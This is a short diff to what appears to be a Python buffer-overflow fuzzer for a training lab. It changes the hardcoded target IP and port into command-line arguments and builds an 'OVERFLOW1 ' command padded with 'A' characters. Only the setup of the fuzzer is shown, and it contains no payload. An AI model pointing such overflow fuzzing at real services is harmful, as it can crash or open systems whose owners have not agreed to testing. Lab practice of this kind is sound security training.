@@ -3,10 +3,13 @@
 
 import socket, time, sys
 
-ip = "10.10.192.203"
+if len(sys.argv) < 3:
+  print('[e] Pass the ip and port as cli params!')
+  print(f'[i] Usage: {sys.argv[0]} ip port')
+  exit()
 
-port = 1337
-timeout = 5
+ip = sys.argv[1]
+port = int(sys.argv[2])
 prefix = "OVERFLOW1 "
 
 string = prefix + "A" * 100
